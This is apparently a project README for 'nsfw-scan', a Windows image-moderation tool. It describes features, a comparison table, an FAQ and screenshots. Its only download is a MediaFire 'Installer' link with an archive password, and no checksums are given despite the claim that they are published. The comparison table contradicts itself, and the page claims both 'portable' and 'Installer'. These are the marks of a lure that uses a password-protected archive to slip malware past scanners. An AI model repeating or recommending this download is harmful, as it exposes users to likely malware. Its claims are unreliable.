# nsfw-scan

🧯 Free, open-source NSFW scanner for Windows — local ONNX classifier flags and quarantines images, nothing uploaded. 100 MB portable, MIT.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **Local classifier inference** — ONNX model runs on your GPU or CPU; images are never uploaded anywhere
- ✅ **Threshold control** — one slider separates safe, borderline and flagged, with per-class scores shown
- ✅ **Quarantine folder** — flagged files moved with a manifest, so nothing is deleted before you look
- ✅ **Keyboard review grid** — arrow through results, keep or restore each item in a fast pass
- ✅ **CSV report** — every file with score and decision for audit trails
- ✅ **Safe re-scan** — restore from quarantine and rescan after tuning thresholds
- ✅ **100 MB self-contained exe** — runtime bundled, classifier downloads separately, offline after that, MIT

## Why nsfw-scan

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB build - no setup required, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **nsfw-scan** | Cloud moderation APIs | Python scripts | Dataset checkers online |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | Paid per call | Free, OSS | Free accounts |
| Open source | **Yes** | No | Yes | No |
| Images stay local | **Yes** | No upload | Yes | No upload
| Quarantine workflow | **Yes** | No | No | No
| Keyboard review pass | **Yes** | No | No | Partial
| Portable, no install | **Yes, 100 MB** | API only | Python env | Browser

## FAQ

**how to scan a large image dataset for NSFW content without uploading it?**

Moderation APIs want per-image fees and a full upload of private datasets, and open scripts stop at printing scores. nsfw-scan runs the classifier locally and gives you a quarantine folder plus a keyboard review pass. It is a 100 MB portable exe, MIT, offline, and nothing leaves the machine.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark scan view (#121417, red #EF4444): scan progress at 61 percent over a 12,400 file set, score histogram right, flagged count chip reading 37 items.
2. Review grid: flagged thumbnails with score badges, keep and quarantine buttons highlighted, keyboard hint strip reading arrows to move, space to keep.
3. Quarantine summary: 37 files listed with original paths, manifest export button, restore selected action, folder size chip reading 214 MB quarantined.

## Download

| Source | Link |
|---|---|
| 💾 **Installer nsfw-scan** | [Installer nsfw-scan](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET 8 SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).